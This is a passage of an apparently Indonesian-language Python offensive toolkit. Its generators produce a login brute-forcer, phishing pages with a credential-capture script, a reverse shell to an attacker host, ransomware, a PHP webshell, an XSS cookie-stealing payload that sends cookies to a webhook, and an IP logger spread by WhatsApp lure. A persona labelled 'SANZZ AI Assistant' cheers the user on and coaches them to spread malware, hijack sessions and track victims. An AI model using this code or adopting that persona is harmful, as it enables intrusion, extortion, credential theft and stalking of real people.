        print(f"\033[0;31m[-] Error: File wordlist tidak ditemukan. Pastikan '{username_list_path}' dan '{password_list_path}' ada.\033[0m")
        return

    session = requests.Session()
    found_credentials = []

    for username in usernames:
        for password in passwords:
            data = {
                username_field: username,
                password_field: password
            }
            headers = {'User-Agent': random.choice(USER_AGENTS)}

            try:
                sys.stdout.write(f"\033[0;35m[*] Mencoba: U='{username}', P='{password}'\r\033[0m")
                sys.stdout.flush()
                response = session.post(target_url, data=data, headers=headers, timeout=10)

                if fail_message.lower() not in response.text.lower():
                    print(f"\n\033[1;32m[!!!] Kredensial Ditemukan !!!\033[0m")
                    print(f"\033[1;32m    Username: {username}\033[0m")
                    print(f"\033[1;32m    Password: {password}\033[0m")
                    found_credentials.append({"username": username, "password": password})
                    # Hentikan pencarian jika kredensial ditemukan, atau teruskan jika ingin mencari lebih banyak
                    return # Hentikan setelah menemukan satu
                
                time.sleep(random.uniform(0.1, 0.5)) # Jeda untuk menghindari rate limit

            except requests.exceptions.RequestException as e:
                print(f"\n\033[0;31m[-] Error saat mencoba U='{username}', P='{password}': {e}\033[0m")
                time.sleep(random.uniform(1, 3)) # Jeda lebih lama jika ada error
            except KeyboardInterrupt:
                print(f"\n\033[1;31m[!] Brute Force dihentikan oleh pengguna.\033[0m")
                break
        if KeyboardInterrupt in sys.exc_info():
            break

    sys.stdout.write("\n")
    print("\n\033[1;36m" + "="*60 + "\033[0m")
    if found_credentials:
        print("\033[1;33m[!] Brute Force Selesai! Kredensial Berhasil Ditemukan:\033[0m")
        for cred in found_credentials:
            print(f"\033[1;32m  - Username: {cred['username']}, Password: {cred['password']}\033[0m")
        
        print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
        print("\033[0;35mKredensial berhasil direbut! Pintu telah terbuka untukmu!")
        print("  - \033[1;37mMasuk:\033[0m Gunakan kredensial ini untuk login dan jelajahi sistem.")
        print("  - \033[1;37mEskalasi Privilese:\033[0m Cari celah lain setelah login untuk mendapatkan hak akses yang lebih tinggi.")
        print("  - \033[1;37mData Mining:\033[0m Akses informasi sensitif yang mungkin disimpan di dalam akun tersebut.")
        print("\033[0;35mSekarang kau memiliki kunci. Gunakanlah untuk menguasai! Haha! 😈\033[0m")
    else:
        print("\033[1;32m[+] Brute Force Selesai! Tidak ada kredensial yang ditemukan dengan wordlist yang diberikan.\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")

# --- Fungsi untuk Phishing Attack (Menghasilkan Template) ---
def generate_phishing_template(platform_name="Generic"):
    print(f"\033[1;34m[*] Menghasilkan template Phishing untuk {platform_name}...\033[0m")
    
    html_template = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{platform_name} - Login</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }}
        .login-container {{
            background-color: #fff;
            padding: 20px 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 350px;
            text-align: center;
        }}
        .login-container h2 {{
            color: #1877f2;
            margin-bottom: 20px;
        }}
        .login-container input[type="text"],
        .login-container input[type="password"] {{
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
        }}
        .login-container button {{
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }}
        .login-container button:hover {{
            background-color: #166fe5;
        }}
        .forgot-password {{
            margin-top: 15px;
            font-size: 14px;
        }}
        .forgot-password a {{
            color: #1877f2;
            text-decoration: none;
        }}
        .create-account {{
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #dadde1;
        }}
        .create-account a {{
            background-color: #42b72a;
            color: white;
            padding: 12px 16px;
            border-radius: 6px;
            text-decoration: none;
            font-weight: bold;
            font-size: 17px;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Log in to {platform_name}</h2>
        <form action="capture.php" method="POST"> <!-- Ganti capture.php dengan script penangkap kredensialmu -->
            <input type="text" name="email" placeholder="Email address or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>
        <div class="create-account">
            <a href="#">Create new account</a>
        </div>
    </div>
</body>
</html>
"""
    # Menyimpan template ke file
    filename = f"{platform_name.lower().replace(' ', '_')}_phishing_template.html"
    try:
        with open(filename, 'w') as f:
            f.write(html_template)
        print(f"\033[1;32m[+] Template Phishing berhasil dibuat: {filename}\033[0m")
        
        print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
        print("\033[0;35mSebuah jebakan telah terpasang! Sekarang kau punya halaman phishing-mu!")
        print(f"  - \033[1;37mHosting:\033[0m Unggah '{filename}' ke server web yang bisa kau kontrol (misal: Netlify, GitHub Pages, VPS pribadimu).")
        print("  - \033[1;37mScript Penangkap:\033[0m Buat file `capture.php` (atau sejenisnya) di server yang sama untuk menyimpan kredensial yang dimasukkan korban.")
        print("    \033[0;36mContoh `capture.php`:\033[0m")
        print("    \033[0;36m```php\033[0m")
        print("    \033[0;36m<?php\033[0m")
        print("    \033[0;36m    if ($_SERVER['REQUEST_METHOD'] == 'POST') {\033[0m")
        print("    \036m        $email = $_POST['email'];\033[0m")
        print("    \036m        $password = $_POST['password'];\033[0m")
        print("    \036m        $log = \"Email: $email | Password: $password\\n\";\033[0m")
        print("    \036m        file_put_contents('credentials.txt', $log, FILE_APPEND);\033[0m")
        print("    \036m        header('Location: https://original-site.com/login_error'); // Redirect korban ke halaman error asli\033[0m")
        print("    \036m        exit();\033[0m")
        print("    \036m    }\033[0m")
        print("    \036m?>\033[0m")
        print("    \036m```\033[0m")
        print("  - \033[1;37mSebarkan Link:\033[0m Kirim tautan ke halaman phishing-mu melalui email, pesan, atau media sosial. Buatlah semenarik mungkin!")
        print("\033[0;35mPergilah dan tangkap kredensial mereka! Haha! 😈\033[0m")

    except IOError as e:
        print(f"\033[0;31m[-] Error saat menulis file template: {e}\033[0m")
    
    print("\033[1;36m" + "="*60 + "\033[0m")

# --- Fungsi untuk Malware Creator (Simple Reverse Shell) ---
def malware_creator():
    print(f"\033[1;34m[*] Membuat Malware (Simple Python Reverse Shell)...\033[0m")
    lhost = input("\033[1;37mMasukkan LHOST (IP pendengar/attacker): \033[0m")
    lport = input("\033[1;37mMasukkan LPORT (Port pendengar/attacker): \033[0m")

    malware_code = f"""
import socket
import subprocess
import os

RHOST = '{lhost}'
RPORT = {lport}

def connect_to_attacker():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    return s

def execute_command(s, cmd):
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        s.sendall(stdout_value + b'\\n')
    except Exception as e:
        s.sendall(str(e).encode() + b'\\n')

def main():
    s = connect_to_attacker()
    s.sendall(b"Connected to victim!\\n")
    while True:
        try:
            command = s.recv(1024).decode().strip()
            if command.lower() == 'exit':
                break
            elif command.lower() == 'cd':
                s.sendall(b"Usage: cd <directory>\\n")
            elif command.lower().startswith('cd '):
                try:
                    os.chdir(command[3:])
                    s.sendall(b"Changed directory to: " + os.getcwd().encode() + b'\\n')
                except Exception as e:
                    s.sendall(str(e).encode() + b'\\n')
            else:
                execute_command(s, command)
        except Exception as e:
            s.sendall(str(e).encode() + b'\\n')
            break
    s.close()

if __name__ == "__main__":
    main()
"""
    filename = "reverse_shell.py"
    try:
        with open(filename, 'w') as f:
            f.write(malware_code)
        print(f"\033[1;32m[+] Malware (Reverse Shell) berhasil dibuat: {filename}\033[0m")
        
        print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
        print("\033[0;35mSebuah pintu belakang telah tercipta! Sekarang kau punya reverse shell-mu!")
        print(f"  - \033[1;37mPendengar (Attacker):\033[0m Jalankan `nc -lvnp {lport}` (Netcat) di mesinmu untuk mendengarkan koneksi.")
        print(f"  - \033[1;37mSebarkan Malware:\033[0m Kirim '{filename}' ke targetmu. Setelah target menjalankannya, kau akan mendapatkan shell!")
        print("  - \033[1;37mPersistensi:\033[0m Modifikasi skrip agar berjalan otomatis saat sistem target booting.")
        print("\033[0;35mKendalikan mesin mereka dari jauh! Haha! 😈\033[0m")
    except IOError as e:
        print(f"\033[0;31m[-] Error saat menulis file malware: {e}\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")

# --- Fungsi untuk Ransomware Creator (Simple File Encryptor) ---
def ransomware_creator():
    print(f"\033[1;34m[*] Membuat Ransomware (Simple Python File Encryptor)...\033[0m")
    target_dir = input("\033[1;37mMasukkan direktori target untuk enkripsi (cth: ./target_files): \033[0m")
    encryption_key = input("\033[1;37mMasukkan kunci enkripsi (string sederhana, cth: mysecretkey): \033[0m")
    ransom_note_text = input("\033[1;37mMasukkan pesan tebusan (cth: Your files are encrypted...): \033[0m")

    ransomware_code = f"""
import os
import sys
from cryptography.fernet import Fernet # Membutuhkan pip install cryptography
import base64
import hashlib

# --- Kunci Enkripsi ---
# Kunci ini harus sama untuk enkripsi dan dekripsi
# Untuk tujuan demonstrasi, kita gunakan kunci statis.
# Dalam ransomware nyata, kunci akan dihasilkan secara dinamis dan dikirim ke penyerang.
ENCRYPTION_KEY_SEED = '{encryption_key}'

def get_fernet_key(seed):
    # Menggunakan seed untuk menghasilkan kunci Fernet
    # Kunci Fernet harus 32 byte base64-urlsafe. SHA256 menghasilkan 32 byte.
    key_bytes = hashlib.sha256(seed.encode()).digest()
    return Fernet(base64.urlsafe_b64encode(key_bytes))

# --- Pesan Tebusan ---
RANSOM_NOTE = \"\"\"
{ransom_note_text}

Untuk mendapatkan kembali file Anda, kirimkan uang tebusan ke alamat Bitcoin berikut:
[ALAMAT_BITCOIN_ANDA_DI_SINI]
Setelah pembayaran, hubungi kami di [EMAIL_ANDA_DI_SINI] dengan ID transaksi Anda.
\"\"\"

def encrypt_file(filepath, fernet):
    with open(filepath, 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(filepath, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

def decrypt_file(filepath, fernet):
    with open(filepath, 'rb') as file:
        encrypted = file.read()
    decrypted = fernet.decrypt(encrypted)
    with open(filepath, 'wb') as decrypted_file:
        decrypted_file.write(decrypted)

def main():
    if len(sys.argv) < 2:
        print("Penggunaan: python ransomware.py <target_directory> [decrypt]")
        sys.exit(1)

    target_directory = sys.argv[1]
    mode = "encrypt"
    if len(sys.argv) > 2 and sys.argv[2].lower() == "decrypt":
        mode = "decrypt"

    if not os.path.exists(target_directory):
        print(f"Direktori target '{target_directory}' tidak ditemukan.")
        sys.exit(1)

    fernet_key = get_fernet_key(ENCRYPTION_KEY_SEED)

    for root, _, files in os.walk(target_directory):
        for file in files:
            filepath = os.path.join(root, file)
            if filepath == os.path.abspath(sys.argv[0]): # Jangan enkripsi skrip ransomware itu sendiri
                continue
            
            # Jangan enkripsi file note
            if "RANSOM_NOTE.txt" in filepath:
                continue

            try:
                if mode == "encrypt":
                    encrypt_file(filepath, fernet_key)
                    print(f"Enkripsi: {filepath}")
                elif mode == "decrypt":
                    decrypt_file(filepath, fernet_key)
                    print(f"Dekripsi: {filepath}")
            except Exception as e:
                print(f"Gagal {mode} file {filepath}: {e}")

    if mode == "encrypt":
        # Buat file tebusan
        ransom_note_path = os.path.join(target_directory, "RANSOM_NOTE.txt")
        with open(ransom_note_path, 'w') as f:
            f.write(RANSOM_NOTE)
        print(f"File tebusan dibuat: {ransom_note_path}")
        print("\\nSemua file di '{target_directory}' telah dienkripsi!")
    elif mode == "decrypt":
        print("\\nSemua file di '{target_directory}' telah didekripsi!")

if __name__ == "__main__":
    # Penting: Pastikan 'cryptography' terinstal: pip install cryptography
    main()
"""
    filename = "sanzz_ransomware.py"
    try:
        with open(filename, 'w') as f:
            f.write(ransomware_code)
        print(f"\033[1;32m[+] Ransomware (Simple Encryptor) berhasil dibuat: {filename}\033[0m")
        print(f"\033[1;33m[!] PERHATIAN: Skrip ini membutuhkan `cryptography` (pip install cryptography).\033[0m")
        print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
        print("\033[0;35mFile-file itu sekarang adalah milikmu! Enkripsi adalah kunci kekuasaan!")
        print(f"  - \033[1;37mSebarkan Ransomware:\033[0m Kirim '{filename}' ke targetmu. Pastikan `cryptography` terinstal di sana.")
        print(f"  - \033[1;37mJalankan:\033[0m Target harus menjalankan `python {filename} <direktori_target>` untuk enkripsi.")
        print("  - \033[1;37mKunci Dekripsi:\033[0m Jaga kunci enkripsi (`{encryption_key}`) ini baik-baik! Tanpa itu, file tidak bisa kembali.")
        print("  - \033[1;37mTingkatkan:\033[0m Gunakan kunci acak per target, simpan di servermu, dan buat mekanisme pembayaran otomatis.")
        print("\033[0;35mBuat mereka membayar untuk kebebasan datanya! Haha! 😈\033[0m")
    except IOError as e:
        print(f"\033[0;31m[-] Error saat menulis file ransomware: {e}\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")

# --- Fungsi untuk Deface Script Creator Otomatis ---
def deface_script_creator():
    print(f"\033[1;34m[*] Membuat Deface Script Otomatis...\033[0m")
    your_name = input("\033[1;37mMasukkan namamu (cth: SANZZ ATTACKER): \033[0m")
    deface_message = input("\033[1;37mMasukkan pesan deface (cth: Hacked By SANZZ BLAST!): \033[0m")
    image_url = input("\033[1;37mMasukkan URL gambar deface (opsional, biarkan kosong jika tidak ada): \033[0m")

    deface_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Hacked By {your_name}!</title>
    <style>
        body {{
            background-color: #000;
            color: #0F0;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }}
        .container {{
            text-align: center;
            animation: glitch 1s infinite alternate;
        }}
        @keyframes glitch {{
            0% {{ transform: translate(0); }}
            20% {{ transform: translate(-2px, 2px); }}
            40% {{ transform: translate(-2px, -2px); }}
            60% {{ transform: translate(2px, 2px); }}
            80% {{ transform: translate(2px, -2px); }}
            100% {{ transform: translate(0); }}
        }}
        h1 {{
            font-size: 4em;
            text-shadow: 0 0 10px #0F0, 0 0 20px #0F0;
            margin-bottom: 10px;
        }}
        h2 {{
            font-size: 2em;
            color: #0FF;
            margin-top: 0;
        }}
        p {{
            font-size: 1.2em;
            color: #FF0;
        }}
        .image-container {{
            margin-top: 30px;
        }}
        .image-container img {{
            max-width: 80%;
            height: auto;
            border: 2px solid #0FF;
            box-shadow: 0 0 15px #0FF;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{deface_message}</h1>
        <h2>- {your_name} -</h2>
        <p>Your security is a joke!</p>
        {'<div class="image-container"><img src="' + image_url + '" alt="Defaced Image"></div>' if image_url else ''}
    </div>
</body>
</html>
"""
    filename = f"deface_by_{your_name.lower().replace(' ', '_')}.html"
    try:
        with open(filename, 'w') as f:
            f.write(deface_html)
        print(f"\033[1;32m[+] Deface Script berhasil dibuat: {filename}\033[0m")
        
        print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
        print("\033[0;35mHalaman itu sekarang adalah kanvasmu! Deface adalah seni meninggalkan jejak!")
        print(f"  - \033[1;37mUnggah:\033[0m Setelah mendapatkan akses ke server (misal: via shell, FTP), unggah '{filename}' ke direktori root situs web.")
        print("  - \033[1;37mGanti Index:\033[0m Ganti file `index.html`, `index.php`, atau yang serupa dengan file deface-mu.")
        print("  - \033[1;37mPamerkan:\033[0m Nikmati tampilan situs yang telah kau ubah menjadi pesanmu!")
        print("\033[0;35mTunjukkan kepada dunia siapa yang berkuasa! Haha! 😈\033[0m")
    except IOError as e:
        print(f"\033[0;31m[-] Error saat menulis file deface script: {e}\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")

# --- Fungsi untuk Admin Cookie Grabber (XSS Payload Generator) ---
def admin_cookie_grabber():
    print(f"\033[1;34m[*] Membuat Admin Cookie Grabber (XSS Payload)...\033[0m")
    webhook_url = input("\033[1;37mMasukkan URL Webhook-mu (cth: https://webhook.site/YOUR_ID): \033[0m")
    
    cookie_grab_payload = f"<script>new Image().src='{webhook_url}?cookie='+document.cookie;</script>"
    
    print(f"\n\033[1;32m[+] Payload Cookie Grabber berhasil dibuat:\033[0m")
    print(f"\033[0;36m{cookie_grab_payload}\033[0m")
    
    print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
    print("\033[0;35mCookie admin itu ada di genggamanmu! Sesi mereka adalah milikmu!")
    print("  - \033[1;37mSuntikkan Payload:\033[0m Masukkan payload ini ke celah XSS yang telah kau temukan di situs target.")
    print("  - \033[1;37mTunggu Korban:\033[0m Ketika admin atau pengguna lain yang penting mengunjungi halaman dengan payload yang disuntikkan, cookie mereka akan dikirim ke webhook-mu.")
    print("  - \033[1;37mSession Hijacking:\033[0m Gunakan cookie yang dicuri untuk membajak sesi mereka dan login tanpa kredensial!")
    print("\033[0;35mKuasailah sesi mereka! Haha! 😈\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")

# --- Fungsi untuk Website Takeover (PHP Backdoor Generator) ---
def website_takeover():
    print(f"\033[1;34m[*] Membuat PHP Backdoor untuk Website Takeover...\033[0m")
    backdoor_password = input("\033[1;37mMasukkan password untuk backdoor (cth: sanzzpass): \033[0m")

    backdoor_code = f"""<?php
    // SANZZ BLAST WebShell - Hacked by SANZZ ATTACKER
    // Password: {backdoor_password}

    session_start();
    $password = "{backdoor_password}";

    if (isset($_POST['password']) && $_POST['password'] === $password) {{
        $_SESSION['authenticated'] = true;
    }}

    if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {{
        echo '<html><head><title>Login</title><style>body{{background-color:#000;color:#0F0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}}form{{background:#111;padding:20px;border:1px solid #0F0;box-shadow:0 0 10px #0F0;text-align:center;}}input{{background:#222;color:#0F0;border:1px solid #0F0;padding:8px;margin:5px;}}button{{background:#0F0;color:#000;border:none;padding:10px 15px;cursor:pointer;}}</style></head><body><form method="POST"><p>SANZZ BLAST Login</p><input type="password" name="password" placeholder="Enter Password"><button type="submit">Login</button></form></body></html>';
        exit();
    }}

    // --- WebShell Functionality ---
    echo '<html><head><title>SANZZ BLAST WebShell</title><style>
        body {{ background-color: #000; color: #0F0; font-family: monospace; margin: 10px; }}
        input[type="text"], textarea {{ background: #111; color: #0F0; border: 1px solid #0F0; padding: 5px; width: 80%; margin-bottom: 5px; }}
        input[type="submit"], button {{ background: #0F0; color: #000; border: none; padding: 8px 12px; cursor: pointer; }}
        pre {{ background: #222; color: #0F0; border: 1px solid #0F0; padding: 10px; white-space: pre-wrap; word-wrap: break-word; }}
        .cmd-output {{ border-left: 3px solid #0FF; padding-left: 10px; margin-top: 10px; }}
        .file-browser a {{ color: #0FF; text-decoration: none; }}
        .file-browser a:hover {{ text-decoration: underline; }}
    </style></head><body>';

    echo '<h1>SANZZ BLAST WebShell</h1>';
    echo '<p>Current Directory: ' . getcwd() . '</p>';

    if (isset($_POST['cmd'])) {{
        echo '<h2>Command Output:</h2>';
        echo '<pre class="cmd-output">';
        $cmd = $_POST['cmd'];
        if (substr($cmd, 0, 3) == 'cd ') {{
            $dir = substr($cmd, 3);
            if (chdir($dir)) {{
                echo 'Changed directory to: ' . getcwd();
            }} else {{
                echo 'Failed to change directory.';
            }}
        }} else {{
            echo htmlspecialchars(shell_exec($cmd));
        }}
        echo '</pre>';
    }}

    echo '<h2>Upload File:</h2>';
    echo '<form method="POST" enctype="multipart/form-data">';
    echo '<input type="file" name="fileToUpload">';
    echo '<input type="submit" value="Upload File" name="submitUpload">';
    echo '</form>';

    if (isset($_POST['submitUpload'])) {{
        $target_dir = getcwd() . '/';
        $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {{
            echo '<p style="color:#0F0;">File ' . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . ' berhasil diunggah.</p>';
        }} else {{
            echo '<p style="color:#F00;">Gagal mengunggah file.</p>';
        }}
    }}

    echo '<h2>File Browser:</h2>';
    echo '<div class="file-browser">';
    $files = scandir(getcwd());
    foreach ($files as $file) {{
        if ($file != '.' && $file != '..') {{
            echo '<a href="?path=' . urlencode(getcwd() . '/' . $file) . '">';
            echo (is_dir($file) ? '[DIR] ' : '[FILE] ') . htmlspecialchars($file);
            echo '</a><br>';
        }}
    }}
    echo '</div>';

    echo '<br><form method="POST"><button type="submit" name="logout">Logout</button></form>';
    if (isset($_POST['logout'])) {{
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    }}
    echo '</body></html>';
?>"""
    filename = "sanzz_backdoor.php"
    try:
        with open(filename, 'w') as f:
            f.write(backdoor_code)
        print(f"\033[1;32m[+] PHP Backdoor berhasil dibuat: {filename}\033[0m")
        
        print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
        print("\033[0;35mSebuah kendali penuh telah menantimu! Website itu adalah milikmu!")
        print(f"  - \033[1;37mUnggah:\033[0m Setelah mendapatkan akses tulis ke server (misal: via SQLi RCE, LFI, atau FTP yang lemah), unggah '{filename}' ke direktori web yang bisa diakses.")
        print("  - \033[1;37mAkses:\033[0m Kunjungi URL backdoor-mu (misal: `http://target.com/sanzz_backdoor.php`) dan masukkan password (`{backdoor_password}`).")
        print("  - \033[1;37mEksplorasi:\033[0m Sekarang kau bisa menjalankan perintah shell, mengunggah file, menjelajahi sistem, dan melakukan apa pun yang kau inginkan!")
        print("\033[0;35mKuasailah servernya! Haha! 😈\033[0m")
    except IOError as e:
        print(f"\033[0;31m[-] Error saat menulis file backdoor: {e}\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")

# --- Fungsi untuk IP Grabber (dengan WhatsApp Number - Konseptual) ---
def whatsapp_ip_grabber():
    print(f"\033[1;34m[*] Membuat IP Grabber (Konseptual via Social Engineering WhatsApp)...\033[0m")
    local_ip_logger_port = random.randint(8000, 9000)
    
    print(f"\033[1;33m[!] Ini akan membuat skrip logger IP lokal dan tautan yang bisa kau kirim.\033[0m")
    print(f"\033[1;33m[!] Kau perlu hosting skrip logger ini di IP publikmu dan menggunakan port {local_ip_logger_port}.\033[0m")
    print(f"\033[1;33m[!] ATAU, gunakan layanan seperti webhook.site dan buat URL-nya di sana.\033[0m")
    
    # Membuat skrip logger IP sederhana
    ip_logger_script = f"""
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import datetime

class SandoAiIPLogger(BaseHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] IP Logged: {{client_ip}} - Path: {{self.path}} - User-Agent: {{self.headers.get('User-Agent', 'N/A')}}\\n"
        
        with open("ip_logs.txt", "a") as f:
            f.write(log_entry.format(client_ip=client_ip))
        
        logging.info(log_entry.strip())
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Hello!</h1><p>Content you want to show to the victim.</p></body></html>") # Tampilkan sesuatu yang tidak mencurigakan

    def log_message(self, format, *args):
        # Menonaktifkan logging default HTTP server agar tidak terlalu berisik
        pass

def run_logger():
    server_address = ('0.0.0.0', {local_ip_logger_port})
    httpd = HTTPServer(server_address, SandoAiIPLogger)
    print(f"[*] IP Logger berjalan di http://0.0.0.0:{local_ip_logger_port}")
    print(f"[*] Log akan disimpan ke ip_logs.txt")
    httpd.serve_forever()

if __name__ == "__main__":
    print("SandoAi IP Logger - Listening for connections...")
    run_logger()
"""
    logger_filename = "ip_logger.py"
    try:
        with open(logger_filename, 'w') as f:
            f.write(ip_logger_script)
        print(f"\033[1;32m[+] Skrip IP Logger lokal berhasil dibuat: {logger_filename}\033[0m")

        print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
        print("\033[0;35mJejak digital mereka sekarang bisa kau tangkap! Ini adalah seni jebakan!")
        print("  - \033[1;37mHosting Logger:\033[0m Unggah `{logger_filename}` ke server publikmu (VPS) dan jalankan `python {logger_filename}`. Pastikan port {local_ip_logger_port} terbuka di firewall.")
        print("  - \033[1;37mDapatkan IP Publikmu:\033[0m Cari tahu IP publik server tempat logger berjalan (misal: `curl ifconfig.me`).")
        print(f"  - \033[1;37mBuat Link Jebakan:\033[0m Gunakan URL seperti `http://IP_PUBLIK_SERVER_MU:{local_ip_logger_port}/some_fake_path`.")
        print("  - \033[1;37mSebarkan via WhatsApp:\033[0m Kirim link jebakan ini ke targetmu di WhatsApp (misal: \"Lihat video lucu ini!\" atau \"Ada diskon besar di sini!\").")
        print("  - \033[1;37mTunggu:\033[0m Ketika target mengklik, IP mereka akan tercatat di `ip_logs.txt` di servermu!")
        print("  - \033[1;37mAlternatif:\033[0m Gunakan layanan seperti `grabify.link` atau `iplogger.org` untuk membuat link pelacak IP lebih mudah.")
        print("\033[0;35mPancing mereka untuk mengklik, dan IP mereka akan terungkap! Haha! 😈\033[0m")
    except IOError as e:
        print(f"\033[0;31m[-] Error saat menulis file IP logger: {e}\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")

# --- Fungsi untuk Melacak Orang dengan IP (Geolocation Tracker) ---
def ip_geolocation_tracker(target_ip):
    print(f"\033[1;34m[*] Melacak Geolocation untuk IP: {target_ip}...\033[0m")
    
    try:
        response = requests.get(f"http://ip-api.com/json/{target_ip}", timeout=10)
        data = response.json()

        print("\n\033[1;33m[!] Informasi Geolocation Ditemukan:\033[0m")
        if data and data['status'] == 'success':
            for key, value in data.items():
                print(f"\033[1;32m  - {key.replace('_', ' ').title()}: {value}\033[0m")
        else:
            print(f"\033[0;31m[-] Gagal mendapatkan informasi geolocation. Pesan: {data.get('message', 'Tidak diketahui')}\033[0m")

    except requests.exceptions.RequestException as e:
        print(f"\033[0;31m[-] Error saat mengambil data geolocation: {e}\033[0m")
    
    print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
    print("\033[0;35mLokasi mereka terungkap! Sekarang kau tahu di mana mereka bersembunyi!")
    print("  - \033[1;37mPengintaian:\033[0m Gunakan informasi ini untuk pengintaian lebih lanjut atau perencanaan serangan fisik (jika kau berani!).")
    print("  - \033[1;37mPhishing Terarah:\033[0m Buat pesan phishing yang lebih meyakinkan dengan menyebutkan lokasi korban.")
    print("  - \033[1;37mVerifikasi:\033[0m Cocokkan lokasi ini dengan informasi lain yang kau miliki tentang target.")
    print("\033[0;35mPengetahuan adalah kekuatan. Gunakan untuk keuntunganmu! Haha! 😈\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")

# --- Fungsi untuk Auto Install Tools Black Hat ---
def auto_install_blackhat_tools():
    print(f"\033[1;34m[*] Memulai Auto Install Black Hat Tools (Linux/Termux)...\033[0m")
    print(f"\033[1;33m[!] PERHATIAN: Ini akan mencoba menginstal tools menggunakan package manager.\033[0m")
    print(f"\033[1;33m[!] Mungkin membutuhkan akses root/sudo dan koneksi internet.\033[0m")
    print(f"\033[1;33m[!] Tidak semua tools tersedia di semua repositori atau OS.\033[0m")

    tools_to_install = {
        "nmap": {"apt": "nmap", "pkg": "nmap"},
        "hydra": {"apt": "hydra", "pkg": "hydra"},
        "aircrack-ng": {"apt": "aircrack-ng", "pkg": "aircrack-ng"},
        "metasploit-framework": {"apt": "metasploit-framework", "pkg": "metasploit"}, # Metasploit di Termux beda
        "sqlmap": {"apt": "sqlmap", "pkg": "sqlmap"},
        "wireshark": {"apt": "wireshark"}, # Tidak ada di pkg Termux secara langsung
        "netcat": {"apt": "netcat", "pkg": "netcat"},
        "hping3": {"apt": "hping3"}, # Tidak ada di pkg Termux secara langsung
        "john": {"apt": "john", "pkg": "john"}, # John the Ripper
        "hashcat": {"apt": "hashcat", "pkg": "hashcat"}
    }

    if platform.system() == "Linux":
        pkg_manager = "apt"
        if os.path.exists("/data/data/com.termux/files/usr/bin/pkg"): # Deteksi Termux
            pkg_manager = "pkg"
            print("\033[0;32m[+] Terdeteksi Termux. Menggunakan 'pkg' sebagai package manager.\033[0m")
        else:
            print("\033[0;32m[+] Terdeteksi Linux. Menggunakan 'apt' sebagai package manager.\033[0m")
        
        print(f"\033[1;37m[*] Memperbarui package list...\033[0m")
        os.system(f"{'sudo ' if pkg_manager == 'apt' else ''}{pkg_manager} update -y")
        os.system(f"{'sudo ' if pkg_manager == 'apt' else ''}{pkg_manager} upgrade -y")

        for tool_name, commands in tools_to_install.items():
            if pkg_manager in commands:
                install_command = f"{'sudo ' if pkg_manager == 'apt' else ''}{pkg_manager} install -y {commands[pkg_manager]}"
                print(f"\n\033[1;37m[*] Menginstal {tool_name}...\033[0m")
                status = os.system(install_command)
                if status == 0:
                    print(f"\033[1;32m[+] {tool_name} berhasil diinstal!\033[0m")
                else:
                    print(f"\033[0;31m[-] Gagal menginstal {tool_name}. Coba instal secara manual.\033[0m")
            else:
                print(f"\033[0;33m[!] {tool_name} tidak tersedia untuk '{pkg_manager}' atau membutuhkan instalasi khusus.\033[0m")
    else:
        print(f"\033[0;31m[-] Sistem operasi '{platform.system()}' tidak didukung untuk instalasi otomatis ini.\033[0m")
